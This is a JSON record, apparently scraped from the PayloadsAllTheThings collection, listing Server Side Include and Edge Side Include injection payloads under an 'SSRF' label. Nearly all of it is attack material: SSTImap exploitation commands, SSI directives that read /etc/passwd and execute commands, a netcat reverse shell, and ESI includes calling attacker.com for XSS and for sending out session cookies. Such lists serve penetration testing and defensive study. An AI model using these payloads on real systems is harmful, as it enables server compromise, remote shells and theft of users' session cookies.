{
  "id": "ssrf-72fa8d1981fc",
  "category": "SSRF",
  "title": "README",
  "description": "# Server Side Include Injection\n\n> Server Side Includes (SSI) are directives that are placed in HTML pages and evaluated on the server while the pages are being served. They let you add dynamically generated content to an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology.\n\n## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n* [Edge Side Inclusion](#edge-side-inclusion)\n* [References](#references)\n\n## Tools\n\n* [vladko312/SSTImap](ht",
  "payloads": [
    "* [vladko312/SSTImap](https://github.com/vladko312/SSTImap) - Automatic SSTI detection tool with interactive interface based on [epinna/tplmap](https://github.com/epinna/tplmap), supports SSI detection and exploitation with `--legacy` or `-e SSI`",
    "python3 ./sstimap.py -u 'https://example.com/page?name=John' --legacy -s",
    "python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e SSI",
    "SSI format: `<!--#directive param=\"value\" -->`",
    "| Print the date          | `<!--#echo var=\"DATE_LOCAL\" -->`         |",
    "| Print the document name | `<!--#echo var=\"DOCUMENT_NAME\" -->`      |",
    "| Print all the variables | `<!--#printenv -->`                      |",
    "| Setting variables       | `<!--#set var=\"name\" value=\"Rich\" -->`   |",
    "| Include a file          | `<!--#include file=\"/etc/passwd\" -->`    |",
    "| Include a file          | `<!--#include virtual=\"/index.html\" -->` |",
    "| Execute commands        | `<!--#exec cmd=\"ls\" -->`                 |",
    "| Reverse shell           | `<!--#exec cmd=\"mkfifo /tmp/f;nc IP PORT 0</tmp/f\\|/bin/bash 1>/tmp/f;rm /tmp/f\" -->` |",
    "| Blind detection         | `<esi:include src=http://attacker.com>`  |",
    "| XSS                     | `<esi:include src=http://attacker.com/XSSPAYLOAD.html>` |",
    "| Cookie stealer          | `<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>` |"
  ],
  "references": [
    "PayloadsAllTheThings/Server Side Include Injection/README.md"
  ],
  "source": "PayloadsAllTheThings"
}